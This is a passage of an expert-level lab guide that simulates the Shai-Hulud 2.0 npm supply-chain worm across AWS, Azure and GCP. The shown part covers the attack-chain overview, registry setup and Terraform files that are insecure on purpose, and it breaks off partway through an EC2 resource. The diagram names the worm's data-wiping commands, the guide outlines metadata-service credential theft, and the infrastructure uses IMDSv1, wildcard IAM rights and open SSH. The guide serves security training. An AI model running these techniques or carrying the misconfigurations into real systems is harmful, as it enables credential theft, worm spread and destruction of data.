# The Second Coming: Shai-Hulud 2.0 Supply Chain Worm Simulation

## Cloud Attack Simulation Lab -- Complete Step-by-Step Guide

**Level:** Expert | **Clouds:** AWS + Azure + GCP (Multi-Cloud) | **Estimated Time:** 10-16 hours (learning pace)
**Based on:** Real attack wave observed November 24, 2025
**Researched by:** Datadog Security Labs, Wiz Research, Unit 42, Trend Micro, Sysdig, Check Point, Netskope, Socket.dev, Semgrep
**Scenario Number:** S-SH2 (supplementary to Master Plan)

---

## The Story

NovaTech is a mid-sized SaaS company building developer tools. Their engineering team relies on npm packages -- both public and internal -- to ship features fast. They maintain 12 internal npm packages used across their microservices, and their CI/CD pipeline runs on GitHub Actions. Their infrastructure spans three clouds: product APIs on AWS, identity and enterprise features on Azure, and data analytics pipelines on GCP. Each cloud environment stores secrets in its respective secrets manager.

A developer on the platform team, Alex, uses a single npm automation token for all CI/CD publishing. The token has no expiration date and no IP restrictions. It was created two years ago when the team was small, and nobody has revisited the setup since. Their GitHub Actions workflows use `pull_request_target` to auto-assign reviewers on incoming PRs -- a common pattern that creates a critical security blind spot.

One morning, a seemingly routine pull request appears on one of NovaTech's open-source repos. The PR modifies a GitHub Actions workflow file. The repository uses `pull_request_target` -- a trigger that runs workflows in the trusted base context -- and the workflow checks out the PR's head commit. The attacker's modified code executes with full access to repository secrets. Within 60 seconds, the PR opens, the workflow runs, the npm token is exfiltrated, and the PR is deleted.

Five days later, the stolen npm token is used to publish backdoored versions of NovaTech's internal packages. The malicious code rides the `preinstall` npm lifecycle hook -- executing before the package even finishes installing. It installs the Bun JavaScript runtime (evading Node.js-specific security tooling), then launches a heavily obfuscated payload that does everything at once:

- Harvests every credential it can find: `.npmrc` tokens, `.env` files, SSH keys, GitHub PATs, git credential helpers
- Downloads TruffleHog and scans the entire home directory for 800+ credential patterns
- Queries the AWS Instance Metadata Service (IMDS) for IAM role credentials, then calls Secrets Manager across 17 regions
- Requests Azure Managed Identity tokens via IMDS, then accesses Key Vault secrets
- Fetches GCP service account tokens from the metadata server, then reads Secret Manager
- Uses the stolen npm token to discover and infect up to 100 other packages owned by the victim
- Registers a self-hosted GitHub Actions runner for persistent command execution via Discussions
- Exfiltrates everything to public GitHub repositories created under the victim's account
- If all authentication fails, wipes the victim's home directory as a dead man's switch

In the real attack, this worm compromised 796 npm packages, created 25,000+ GitHub repositories, and exposed approximately 14,000 secrets across 487 organizations. Companies like Zapier, PostHog, Postman, and AsyncAPI were hit. CISA, Microsoft, and AWS all issued emergency advisories. npm revoked all classic automation tokens on December 9, 2025.

You are about to recreate every step of this attack. You will:

- Build the actual `pull_request_target` exploit that started the PostHog compromise
- Install the real Bun runtime as a detection evasion technique
- Run TruffleHog against seeded credential repositories and watch it find "deleted" secrets in git history
- SSH into real cloud VMs and steal credentials from metadata services with `curl` on AWS, Azure, and GCP
- Watch worm propagation cascade through transitive npm dependencies
- Register a real self-hosted GitHub Actions runner and execute commands via Discussion-based C2

Everything happens in isolated lab infrastructure. The worm never touches the public npm registry. Every credential it steals is one you planted. Every package it infects is one you published to your own private registry. Every GitHub repo it creates is under your own account.

This is the most complex scenario in the portfolio. Let's begin.

---

## Attack Chain Diagram

```
     TIME
      |
      |   PHASE 0: INITIAL ACCESS
      |   +----------------------------------------------------------+
      |   | pull_request_target EXPLOIT                               |
      |   | Create vulnerable GitHub Actions workflow                 |
      |   | Submit PR with malicious checkout code                    |
      |   | Workflow runs in trusted context -> secrets exposed       |
      |   | NPM_TOKEN exfiltrated via workflow execution              |
      |   | MITRE: T1195.002 (Supply Chain: Software Supply Chain)    |
      |   +----------------------------+-----------------------------+
      |                                |
      |   PHASE 1: PAYLOAD DELIVERY    v
      |   +----------------------------------------------------------+
      |   | MALICIOUS PACKAGE INJECTION                               |
      |   | Inject setup_bun.js + bun_environment.js into package    |
      |   | preinstall hook runs BEFORE install completes             |
      |   | Dropper installs REAL Bun runtime (evasion technique)     |
      |   | Payload launches as detached Bun background process       |
      |   | MITRE: T1195.002 (Supply Chain Compromise)                |
      |   +----------------------------+-----------------------------+
      |                                |
      |   PHASE 2: CREDENTIAL         v
      |   HARVESTING
      |   +----------------------------------------------------------+
      |   | LOCAL CREDENTIAL HARVESTING + TRUFFLEHOG                  |
      |   | Scan: .npmrc, .env, SSH keys, GitHub PATs, git creds     |
      |   | Download + run real TruffleHog (800+ credential patterns) |
      |   | TruffleHog finds secrets in git history others miss       |
      |   | Dump: process.env (full environment variable capture)     |
      |   | MITRE: T1552.001 (Credentials in Files)                   |
      |   +----------------------------+-----------------------------+
      |                                |
      |   +-----------+----------------+-----------------+
      |   |           |                                  |
      |   v           v                                  v
      |   +----------------+ +------------------+ +------------------+
      |   | AWS SECRETS    | | AZURE SECRETS    | | GCP SECRETS      |
      |   | SSH into EC2   | | SSH into VM      | | SSH into GCE     |
      |   | curl IMDSv1    | | curl IMDS +      | | curl metadata    |
      |   |   no auth!     | |   Metadata:true  | |   Flavor:Google  |
      |   | Steal IAM creds| | Steal MI token   | | Steal SA token   |
      |   | Use creds for: | | Use token for:   | | Use token for:   |
      |   | Secrets Manager| | Key Vault REST   | | Secret Manager   |
      |   | SSM parameters | | API with Bearer  | | API with Bearer  |
      |   | across 17 rgns | | token directly   | | token directly   |
      |   | T1552.005      | | T1528            | | T1552.005        |
      |   +-------+--------+ +--------+---------+ +--------+---------+
      |           |                    |                    |
      |           +--------------------+--------------------+
      |                                |
      |   PHASE 3: SELF-PROPAGATION    v
      |   +----------------------------------------------------------+
      |   | WORM SELF-PROPAGATION (Verdaccio Registry)                |
      |   | npm API: enumerate victim's other packages                |
      |   | Download, inject payload, bump version, republish         |
      |   | Parallelized: up to 100 packages per victim               |
      |   | Each infected package becomes new propagation vector      |
      |   | CASCADING DEMO: install meta-package, watch payload       |
      |   | fire 3x through transitive dependencies                   |
      |   | MITRE: T1195.002 (Supply Chain Compromise)                |
      |   +----------------------------+-----------------------------+
      |                                |
      |   PHASE 4: PERSISTENCE         v
      |   +----------------------------------------------------------+
      |   | GITHUB ACTIONS PERSISTENCE + DISCUSSIONS C2               |
      |   | 1. Create exfil repo with campaign marker                 |
      |   | 2. Upload triple-Base64-encoded stolen data               |
      |   | 3. Request runner registration token via GitHub API       |
      |   | 4. Download + install REAL self-hosted runner              |
      |   | 5. Register runner as "SHA1HULUD" on victim's machine     |
      |   | 6. Create discussion.yaml with expression injection       |
      |   | 7. Post Discussion -> observe command execution on runner  |
      |   | MITRE: T1059.009 (Cloud API), T1098 (Account Manip)      |
      |   +----------------------------+-----------------------------+
      |                                |
      |   PHASE 5: EXFILTRATION        v
      |   +----------------------------------------------------------+
      |   | EXFILTRATION + CROSS-VICTIM CREDENTIAL RECYCLING          |
      |   | Triple-Base64-encode stolen data                          |
      |   | Upload as files to GitHub repositories                    |
      |   | Search for other campaign repos to recycle credentials    |
      |   | Use Victim A's token to exfil under Victim B's account    |
      |   | MITRE: T1567.001 (Exfil to Code Repository)               |
      |   +----------------------------+-----------------------------+
      |                                |
      |   PHASE 6: DEAD MAN'S SWITCH   v
      |   +----------------------------------------------------------+
      |   | DESTRUCTIVE FAILSAFE (Documented Only - Never Executes)   |
      |   | If: no GitHub AND no npm AND no fetched tokens            |
      |   | Then: shred -uvz -n 1 on all writable files in $HOME     |
      |   | Windows: del /F /Q /S + cipher /W (overwrite free space)  |
      |   | MITRE: T1485 (Data Destruction)                           |
      |   +----------------------------------------------------------+
      |
      v
```

---

## What You Will Learn

By the end of this scenario, you will understand:

- **GitHub Actions security**: Why `pull_request_target` is dangerous, how to exploit it step-by-step, and how to defend against "pwn request" attacks
- **npm ecosystem security**: How `preinstall` hooks execute arbitrary code, how automation tokens bypass 2FA, how the npm registry API works for package enumeration and publishing
- **Private npm registries**: How Verdaccio works, how organizations self-host package registries, and why this is both a defense mechanism and a potential target
- **Runtime evasion**: Why attackers install alternative JavaScript runtimes (Bun) to evade Node.js-specific security monitoring tools
- **TruffleHog weaponization**: How a legitimate open-source secret scanner gets used offensively, and how it finds "deleted" credentials buried in git history that simple file scans miss
- **AWS IMDS (hands-on)**: SSH into an EC2 instance, run `curl http://169.254.169.254/...`, and watch real temporary IAM credentials appear. Understand IMDSv1 vs IMDSv2 and why the difference matters
- **Azure IMDS (hands-on)**: SSH into an Azure VM, request a Managed Identity token with the `Metadata: true` header, and use it to call Key Vault REST APIs directly with `curl`
- **GCP metadata server (hands-on)**: SSH into a GCE instance, steal a service account token with `Metadata-Flavor: Google`, and access Secret Manager via REST API
- **Multi-cloud secrets management**: AWS Secrets Manager + SSM Parameter Store, Azure Key Vault, and GCP Secret Manager -- how they store secrets, how IAM controls access, and how attackers enumerate them
- **Supply chain worm mechanics**: How self-propagation works through the npm registry API, and how transitive dependencies create exponential cascading infection
- **GitHub Actions persistence**: Register a real self-hosted runner on your machine, see GitHub dispatch workflows to it, and understand how Discussions serve as a C2 channel via expression injection
- **Exfiltration techniques**: Triple-Base64 encoding, GitHub repos as data staging areas, and cross-victim credential recycling through campaign marker searches
- **Destructive failsafes**: How the dead man's switch created a hostage dynamic that complicated coordinated incident response
- **MITRE ATT&CK**: 15+ cloud techniques mapped to real attack steps
- **CNAPP detection**: What Prisma Cloud / Cortex Cloud would alert on at every stage across all three clouds

---

## Lab Architecture Overview

```
+---------------------+     +---------------------+     +---------------------+
|       AWS           |     |       AZURE         |     |       GCP           |
|  EC2 (Amazon Linux) |     |  VM (Ubuntu 24.04)  |     |  GCE (Debian 12)    |
|  - SSH via key pair |     |  - SSH via password  |     |  - SSH via gcloud   |
|  - IMDSv1 enabled   |     |  - Public IP + NSG   |     |  - Public IP        |
|    (the vuln!)      |     |  - System-Assigned   |     |  - Service Account  |
|  - IAM role with    |     |    Managed Identity  |     |    with project-    |
|    wildcard Secrets  |     |  - Key Vault access  |     |    level Secret     |
|    Manager access   |     |    via access policy  |     |    Manager access   |
|  - 3 SM secrets     |     |  - 3 KV secrets      |     |  - 3 SM secrets     |
|  - 2 SSM params     |     |                      |     |                     |
|  - Seeded creds     |     |  - Seeded creds      |     |  - Seeded creds     |
|    (.npmrc, .env,   |     |    (.npmrc, .env,    |     |    (.npmrc, .env,   |
|    git history)     |     |    git history)      |     |    git history)     |
+----------+----------+     +----------+----------+     +----------+----------+
           |                           |                           |
           +---------------------------+---------------------------+
                                       |
                            +----------+----------+
                            |   YOUR WORKSTATION   |
                            |                      |
                            |  Docker:             |
                            |  - Verdaccio (4873)  |
                            |    5 victim packages |
                            |                      |
                            |  GitHub:             |
                            |  - Vulnerable repo   |
                            |    (Phase 0 exploit) |
                            |  - C2/exfil repo     |
                            |    (Phase 4 persist) |
                            |  - Self-hosted runner|
                            |    "SHA1HULUD"       |
                            |  - Discussions C2    |
                            |                      |
                            |  Installed by worm:  |
                            |  - Bun runtime       |
                            |  - TruffleHog binary |
                            +---------------------+
```

---

## Scenario Difficulty Rating

| Dimension | Rating | Why |
|---|---|---|
| Infrastructure complexity | 5/5 | Three cloud providers + Docker + GitHub (x2 repos) + runner |
| Attack chain length | 5/5 | 15+ distinct steps across six phases |
| Concepts to learn | 5/5 | npm internals, IMDS on 3 clouds, Bun evasion, TruffleHog, GitHub Actions C2 |
| Realism | 5/5 | Real IMDS theft, real Bun install, real runner registration, real expression injection |
| Time to complete | 5/5 | 10-16 hours at learning pace |

This is the hardest scenario in the portfolio. If you have not completed Scenarios 1-3 (or equivalent AWS/Azure/GCP fundamentals), do those first.

---

# PART 1: INFRASTRUCTURE SETUP

## Prerequisites

Before starting, ensure you have:

1. **Dedicated lab accounts** on all three clouds (NEVER use production accounts):
   - AWS lab account with admin credentials configured (`aws configure`)
   - Azure subscription with Contributor + User Access Administrator roles
   - GCP project with Editor role
2. **Terraform** >= 1.11.0 installed
3. **AWS CLI v2** installed and configured with admin credentials for the lab account
4. **Azure CLI** (`az`) installed and logged in via `az login`
5. **Google Cloud CLI** (`gcloud`) installed and authenticated via `gcloud auth login`
6. **Docker** installed and running (for the Verdaccio private npm registry)
7. **Node.js** >= 20 with npm >= 10 installed
8. **Python 3.11+** installed (for package.json manipulation and secret encryption)
9. **jq** installed (for parsing JSON output from APIs)
10. **curl** installed (should be preinstalled on any modern OS)
11. **A GitHub account** with a **classic** Personal Access Token (PAT) with scopes: `repo`, `workflow`

Verify all tools are installed and working:

```bash
# Check all tool versions
echo "=== Tool Versions ==="
terraform --version        # Should be >= 1.11.0
aws --version              # Should be 2.x
az version --output table 2>/dev/null || az --version | head -2  # Should show azure-cli 2.x
gcloud --version 2>/dev/null | head -2  # Should show Google Cloud SDK 4xx+
docker --version           # Any recent version
node --version             # Should be >= 20.x
npm --version              # Should be >= 10.x
python3 --version          # Should be >= 3.11
jq --version               # Any version
curl --version | head -1   # Any version
# Install sshpass (needed for Azure VM password-based SSH)
sudo apt install -y sshpass

echo ""
echo "=== Cloud Authentication ==="
echo "AWS account:"
aws sts get-caller-identity --query '{Account:Account,Arn:Arn}' --output table
echo ""
echo "Azure subscription:"
az account show --query '{Id:id,Name:name}' --output table
echo ""
echo "GCP project:"
gcloud config get project
```

**Flag breakdown for `aws sts get-caller-identity`:**
- `sts` -- AWS Security Token Service, manages temporary credentials
- `get-caller-identity` -- Returns details about the IAM user/role making the call
- `--query '{Account:Account,Arn:Arn}'` -- JMESPath query to extract just the account ID and ARN
- `--output table` -- Format the output as a readable table

**Stop immediately** if any command shows a production account/project.

## Step 1: Create a GitHub Personal Access Token

You need a GitHub PAT for the `pull_request_target` exploit (Phase 0) and the GitHub Actions persistence (Phase 4). Create a **classic** token at:

https://github.com/settings/tokens

Required scopes:
- **`repo`** -- Full control of private repositories. Needed for creating repos, managing secrets, configuring runners.
- **`workflow`** -- Update GitHub Action workflows. Needed for creating workflow files via the API.

```bash
# Store your GitHub credentials for the entire lab session
export GITHUB_PAT="<YOUR_GITHUB_PAT>"
export GITHUB_USERNAME="<YOUR_GITHUB_USERNAME>"

# Verify the token is valid and has the right scopes
curl -s -I \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/user | grep -E "^(x-oauth-scopes|HTTP)"
```

**Flag breakdown:**
- `-s` -- Silent mode (no progress bar)
- `-I` -- Fetch headers only (we just need to check the scopes header)
- `-H "Authorization: token ${GITHUB_PAT}"` -- Authenticate with the classic PAT
- `-H "Accept: application/vnd.github+json"` -- Request GitHub's v3 API JSON format
- `grep -E "^(x-oauth-scopes|HTTP)"` -- Extract the HTTP status and the scopes header

**Expected output:**
```
HTTP/2 200
x-oauth-scopes: repo, workflow
```

If you see `401` or missing scopes, regenerate the token.

```bash
# Also verify the username
curl -s -H "Authorization: token ${GITHUB_PAT}" https://api.github.com/user | jq '.login'
# Expected: "your-username"
```

## Step 2: Start the Private Verdaccio npm Registry

**Verdaccio** is a lightweight, open-source npm registry that runs locally. Think of it as a self-hosted version of npmjs.com. In this lab, it simulates the public npm registry -- all package publishing and installation happens against this isolated instance. Nothing touches the real npmjs.com.

Organizations commonly run private registries (Verdaccio, Artifactory, Nexus, GitHub Packages) to host internal packages. The Shai-Hulud 2.0 worm specifically targeted organizations' private packages because they often have fewer security controls than public npm.

```bash
# Create a directory for Verdaccio data persistence
# This stores all published packages across container restarts
mkdir -p ~/verdaccio-storage
sudo chown 10001:65533 ~/verdaccio-storage

# Start Verdaccio in Docker
docker run -d \
  --name verdaccio \
  -p 4873:4873 \
  -v ~/verdaccio-storage:/verdaccio/storage \
  verdaccio/verdaccio:latest
```

**Flag breakdown:**
- `run` -- Create and start a new container
- `-d` -- Detached mode (run in background, return control to terminal)
- `--name verdaccio` -- Name the container "verdaccio" for easy reference in later commands
- `-p 4873:4873` -- Map host port 4873 to container port 4873 (Verdaccio's default HTTP port)
- `-v ~/verdaccio-storage:/verdaccio/storage` -- Mount a host directory for persistent storage. Published packages survive container restarts.
- `verdaccio/verdaccio:latest` -- The official Verdaccio Docker image
- `sudo chown 10001:65533` -- Verdaccio runs as uid 10001 inside the container. Without this, it cannot write to the mounted storage directory (htpasswd, package data)
```bash
# Wait for Verdaccio to finish starting up
sleep 5

# Verify it is running and responding
curl -sf http://localhost:4873/-/ping && echo " Verdaccio is running!" || echo " FAILED - check docker logs verdaccio"
```

**Expected output:** `ok Verdaccio is running!`

If you see `FAILED`, check the container logs: `docker logs verdaccio`

Now register the "victim" npm user account on your private registry:

```bash
# Create a user account on the Verdaccio registry.
# This is the "victim" maintainer -- the person whose npm token gets stolen.
# npm adduser sends a PUT /-/user/org.couchdb.user:<username> request.
npm adduser --registry http://localhost:4873
```

When prompted, enter:
- **Username:** `novatech-bot`
- **Password:** `novatech123`
- **Email:** `bot@novatech.dev`

```bash
# Verify the authentication token was stored in ~/.npmrc
grep "localhost:4873" ~/.npmrc
```

**Expected output:**
```
//localhost:4873/:_authToken="<some-token-string>"
```

**What this token is:** An npm authentication token. Anyone who possesses this string can publish packages as the `novatech-bot` user. In the real Shai-Hulud 2.0 attack, tokens like this were stored as GitHub Actions secrets and stolen via the `pull_request_target` exploit.

```bash
# Extract and store the npm token (this is what the attacker steals)
export VICTIM_NPM_TOKEN=$(grep "localhost:4873" ~/.npmrc | sed 's/.*_authToken=//')
echo "Victim npm token: ${VICTIM_NPM_TOKEN}"
```

**What `sed` does here:**
- First `sed`: Remove everything before `_authToken="` to isolate the token value

** ONLY if the token have trailing quotes use this instead:
export VICTIM_NPM_TOKEN=$(grep "localhost:4873" ~/.npmrc | sed 's/.*_authToken="//' | sed 's/"//')
echo "Victim npm token: ${VICTIM_NPM_TOKEN}"


Save this token -- the attacker "steals" it in Phase 0.

## Step 3: Publish Victim Packages to Verdaccio

```bash
# Tell npm that @novatech scoped packages live on Verdaccio
npm config set @novatech:registry http://localhost:4873
```

**What `npm config` does here:**
Scoped packages (@novatech/...) default to the public npmjs registry. This setting routes all @novatech lookups and publishes to your local Verdaccio instead.

Create and publish five npm packages that simulate NovaTech's internal libraries. The worm will discover and infect these during the self-propagation phase.

```bash
mkdir -p ~/shai-hulud-lab/packages
cd ~/shai-hulud-lab/packages

# Create 5 packages with realistic names and descriptions
for pkg_info in \
  "auth-helpers:2.4.1:NovaTech authentication helper utilities" \
  "db-connector:1.8.3:NovaTech database connection pool manager" \
  "logger:3.1.0:NovaTech structured logging library" \
  "config-loader:1.2.0:NovaTech configuration loader with environment support" \
  "api-client:4.0.2:NovaTech internal API client SDK"; do

  # Split the info string on colons
  IFS=':' read -r name version desc <<< "${pkg_info}"
  dir="novatech-${name}"
  mkdir -p "${dir}"

  # Create package.json
  cat > "${dir}/package.json" << PKGJSON
{
  "name": "@novatech/${name}",
  "version": "${version}",
  "description": "${desc}",
  "main": "index.js",
  "scripts": {},
  "author": "NovaTech Platform Team",
  "license": "MIT"
}
PKGJSON

  # Create a minimal index.js
  cat > "${dir}/index.js" << INDEXJS
// ${desc} v${version}
module.exports = {
  ping: () => "pong from @novatech/${name}@${version}",
  version: "${version}"
};
INDEXJS

  # Publish to Verdaccio
  echo "Publishing @novatech/${name}@${version}..."
  npm publish "./${dir}" --registry http://localhost:4873
done
```

**What `npm publish` does:**
- Reads `package.json` to determine the package name, version, and metadata
- Creates a tarball (`.tgz`) of the package contents
- Sends a `PUT /<package-name>` request to the registry with the tarball as the body
- The registry stores the tarball and makes it available for `npm install`

```bash
# Verify all 5 packages are published
echo ""
echo "=== Published packages ==="
curl -s "http://localhost:4873/-/v1/search?text=novatech&size=20" | \
  jq -r '.objects[] | "\(.package.name)@\(.package.version) - \(.package.description)"'
```

**Expected output:**
```
@novatech/auth-helpers@2.4.1 - NovaTech authentication helper utilities
@novatech/db-connector@1.8.3 - NovaTech database connection pool manager
@novatech/logger@3.1.0 - NovaTech structured logging library
@novatech/config-loader@1.2.0 - NovaTech configuration loader with environment support
@novatech/api-client@4.0.2 - NovaTech internal API client SDK
```

**What just happened:**
- You created five realistic npm packages simulating an organization's internal library ecosystem
- Each was published to your local Verdaccio registry at http://localhost:4873
- The registry now has a `novatech-bot` user who "maintains" all five packages
- The npm token stored in `~/.npmrc` grants publish access to ALL of them
- This single token is the entire attack surface -- whoever has it can modify any package

## Step 4: Deploy Multi-Cloud Infrastructure with Terraform

Now deploy intentionally vulnerable infrastructure across AWS, Azure, and GCP. Each cloud gets:
- A VM with SSH access and overprivileged cloud credentials
- Secrets in the provider's secrets management service
- Seeded fake developer credentials on disk (for TruffleHog to discover)

### Directory Structure

```
~/shai-hulud-lab/terraform/
  providers.tf        # Provider configuration for AWS + Azure + GCP
  variables.tf        # Input variables
  main.tf             # All cloud resources (VMs, IAM, secrets, networking)
  outputs.tf          # Values needed for the attack phase (IPs, names, keys)
  terraform.tfvars.example
```

```bash
mkdir -p ~/shai-hulud-lab/terraform
cd ~/shai-hulud-lab/terraform
```

### providers.tf

```bash
cat > providers.tf << 'EOF'
# ============================================================================
# PROVIDER CONFIGURATION -- AWS + Azure + GCP
# ============================================================================
# Configures Terraform to work with all three major cloud providers.
# Version constraints ensure reproducible deployments across machines.
# ============================================================================

terraform {
  # Require Terraform 1.11 or newer for stable multi-provider support
  required_version = ">= 1.11.0"

  required_providers {
    # AWS Provider v6.x -- latest major version
    # Includes multi-region resource support and resource identity features
    # Used for: EC2 instance, IAM role, Secrets Manager, SSM Parameter Store
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.35"
    }

    # Azure Provider v4.x -- current stable major version
    # Used for: Linux VM, Managed Identity, Key Vault, VNet, NSG
    azurerm = {
      source  = "hashicorp/azurerm"
      version = "~> 4.63"
    }

    # GCP Provider v7.x -- current stable major version
    # Used for: Compute Engine instance, Service Account, Secret Manager
    google = {
      source  = "hashicorp/google"
      version = "~> 7.22"
    }

    # Random provider -- generates unique suffixes for globally unique names
    random = {
      source  = "hashicorp/random"
      version = "~> 3.6"
    }

    # TLS provider -- generates SSH key pairs for EC2 access
    tls = {
      source  = "hashicorp/tls"
      version = "~> 4.0"
    }
  }
}

# AWS Provider
# Deploys resources in us-east-1 by default.
# default_tags applies tags to EVERY AWS resource automatically.
provider "aws" {
  region = var.aws_region

  default_tags {
    tags = {
      Project  = "cloud-attack-lab"
      Scenario = "shai-hulud-2"
    }
  }
}

# Azure Provider
# The features block is required by azurerm and configures provider behavior.
# We enable purge_soft_delete_on_destroy so Key Vault cleanup is clean.
provider "azurerm" {
  features {
    key_vault {
      purge_soft_delete_on_destroy    = true
      recover_soft_deleted_key_vaults = true
    }
  }
  subscription_id = var.azure_subscription_id
}

# GCP Provider
# project and region are set at the provider level so individual
# resources do not need to repeat them.
provider "google" {
  project = var.gcp_project_id
  region  = var.gcp_region
}
EOF
echo "providers.tf created"
```

### variables.tf

```bash
cat > variables.tf << 'EOF'
# ============================================================================
# INPUT VARIABLES
# ============================================================================
# These variables configure the lab environment across all three clouds.
# Copy terraform.tfvars.example to terraform.tfvars and fill in your values.
# ============================================================================

# --- General ---

variable "project_prefix" {
  description = "Short prefix for all resource names. Use your initials or a short identifier to avoid name collisions."
  type        = string
  default     = "sh2"
}

# --- AWS ---

variable "aws_region" {
  description = "AWS region for deploying resources. us-east-1 is recommended (cheapest, most services)."
  type        = string
  default     = "us-east-1"
}

# --- Azure ---

variable "azure_subscription_id" {
  description = "Azure subscription ID. Find with: az account show --query id --output tsv"
  type        = string
}

variable "azure_location" {
  description = "Azure region for deploying resources. eastus is recommended (cheapest)."
  type        = string
  default     = "eastus"
}

# --- GCP ---

variable "gcp_project_id" {
  description = "GCP project ID. Find with: gcloud config get project"
  type        = string
}

variable "gcp_region" {
  description = "GCP region for deploying resources."
  type        = string
  default     = "us-central1"
}

variable "gcp_zone" {
  description = "GCP zone for Compute Engine instances."
  type        = string
  default     = "us-central1-a"
}
EOF
echo "variables.tf created"
```

### terraform.tfvars.example

```bash
cat > terraform.tfvars.example << 'EOF'
# ============================================================================
# LAB CONFIGURATION
# Copy this file to terraform.tfvars and fill in your values.
# ============================================================================

# Your initials or a short prefix (keeps resource names unique)
project_prefix = "sh2"

# AWS region (us-east-1 recommended)
aws_region = "us-east-1"

# Azure subscription ID
# Find with: az account show --query id --output tsv
azure_subscription_id = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# GCP project ID
# Find with: gcloud config get project
gcp_project_id = "your-gcp-project-id"
EOF
echo "terraform.tfvars.example created"
```

### main.tf -- The Core Infrastructure

This is the largest file. Every resource has detailed comments explaining:
- What the resource is (plain English)
- Why it is configured this way
- What the attacker exploits about it
- What the secure alternative would be

```bash
cat > main.tf << 'TFEOF'
# ============================================================================
# SHAI-HULUD 2.0 LAB -- MAIN INFRASTRUCTURE
# ============================================================================
# Creates intentionally vulnerable infrastructure across AWS, Azure, and GCP.
#
# EACH cloud environment gets:
#   1. A VM with SSH access (for the student to SSH in and steal IMDS creds)
#   2. Overprivileged cloud credentials attached to the VM
#   3. Secrets in the cloud provider's secrets management service
#   4. Seeded fake developer credentials on disk (for TruffleHog to find)
#
# Every misconfiguration is documented with what it enables and how to fix it.
# ============================================================================

# Random suffix ensures globally unique names (S3 buckets, Key Vaults, etc.)
resource "random_id" "suffix" {
  byte_length = 4
}

locals {
  suffix = random_id.suffix.hex
  name   = "${var.project_prefix}-${local.suffix}"
}

# ============================================================================
#                              AWS RESOURCES
# ============================================================================
# Creates:
#   - EC2 instance with IMDSv1 enabled (the critical vulnerability)
#   - IAM role with wildcard Secrets Manager + SSM access
#   - 3 Secrets Manager secrets + 2 SSM parameters
#   - SSH key pair for remote access
#   - Seeded fake credentials on disk for TruffleHog
#
# The attacker will:
#   1. SSH into the EC2 instance
#   2. curl the IMDS endpoint to steal IAM role temporary credentials
#   3. Use those credentials to enumerate and exfiltrate all secrets
# ============================================================================

# --- SSH Key Pair ---
# Terraform generates an ED25519 key pair so the student does not need to
# manage SSH keys manually. The private key is exported as a Terraform output.
resource "tls_private_key" "ssh_key" {
  algorithm = "ED25519"
}

resource "aws_key_pair" "lab_key" {
  key_name   = "${local.name}-key"
  public_key = tls_private_key.ssh_key.public_key_openssh
}

# --- IAM Role for EC2 ---
# This role is INTENTIONALLY OVERPRIVILEGED.
# It has read access to Secrets Manager and SSM across ALL regions with
# Resource: "*" (wildcard). This means any secret in any region is accessible.
#
# ATTACKER EXPLOITS: Steal temporary credentials via IMDS, then use them
#   to call GetSecretValue on every secret in every region.
# SECURE ALTERNATIVE:
#   1. Scope Resource to specific secret ARNs
#   2. Use Condition keys to restrict to specific regions
#   3. Use aws:SourceVpc condition to prevent off-instance usage

resource "aws_iam_role" "ec2_role" {
  name = "${local.name}-ec2-role"

  # The assume_role_policy defines WHO can use this role.
  # "Service": "ec2.amazonaws.com" means only EC2 instances can assume it.
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action    = "sts:AssumeRole"
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
    }]
  })
}

# Inline policy granting overprivileged access to secrets
resource "aws_iam_role_policy" "ec2_secrets_policy" {
  name = "${local.name}-secrets-policy"
  role = aws_iam_role.ec2_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        # OVERPRIVILEGED: Can read ANY secret in Secrets Manager in ANY region
        # The worm calls ListSecrets + GetSecretValue across 17 regions
        Effect = "Allow"
        Action = [
          "secretsmanager:ListSecrets",      # Enumerate all secret names
          "secretsmanager:GetSecretValue",    # Read the actual secret content
          "secretsmanager:BatchGetSecretValue", # Read multiple secrets at once
          "secretsmanager:DescribeSecret"     # Get secret metadata
        ]
        Resource = "*"  # <-- THIS IS THE PROBLEM: wildcard = all secrets
      },
      {
        # OVERPRIVILEGED: Can read ANY SSM parameter
        Effect = "Allow"
        Action = [
          "ssm:GetParameter",           # Read a single parameter
          "ssm:GetParameters",           # Read multiple parameters by name
          "ssm:GetParametersByPath",     # Read all parameters under a path prefix
          "ssm:DescribeParameters"       # List parameter metadata
        ]
        Resource = "*"  # <-- wildcard again
      },
      {
        # STS GetCallerIdentity requires no permissions, but including it
        # here makes the policy self-documenting
        Effect   = "Allow"
        Action   = ["sts:GetCallerIdentity"]
        Resource = "*"
      }
    ]
  })
}

# Instance profile -- the bridge between an EC2 instance and an IAM role.
# When an instance has an instance profile, the IMDS endpoint provides
# temporary credentials for the associated role.
resource "aws_iam_instance_profile" "ec2_profile" {
  name = "${local.name}-ec2-profile"
  role = aws_iam_role.ec2_role.name
}

# --- Networking ---
# Using the default VPC for simplicity. In production, use private subnets
# with no internet gateway and access services via VPC endpoints.

data "aws_vpc" "default" {
  default = true
}

data "aws_subnets" "default" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.default.id]
  }
}

# Security group allowing SSH from anywhere
# ATTACKER EXPLOITS: Allows the student to SSH in from their workstation
# SECURE ALTERNATIVE: Restrict to your IP, or use SSM Session Manager (no SSH needed)
resource "aws_security_group" "lab_sg" {
  name        = "${local.name}-sg"
  description = "SSH access for Shai-Hulud lab"
  vpc_id      = data.aws_vpc.default.id

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "SSH from anywhere (lab only - restrict in production)"
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    description = "Allow all outbound (needed for package installs)"
  }
}

# --- EC2 Instance ---
# Amazon Linux 2023, t3.micro (free-tier eligible)
data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "name"
    values = ["al2023-ami-2023.*-x86_64"]
  }
  filter {
    name   = "state"
    values = ["available"]
  }
}

resource "aws_instance" "lab_instance" {
  ami                    = data.aws_ami.amazon_linux.id
  instance_type          = "t3.micro"
  key_name               = aws_key_pair.lab_key.key_name
  iam_instance_profile   = aws_iam_instance_profile.ec2_profile.name
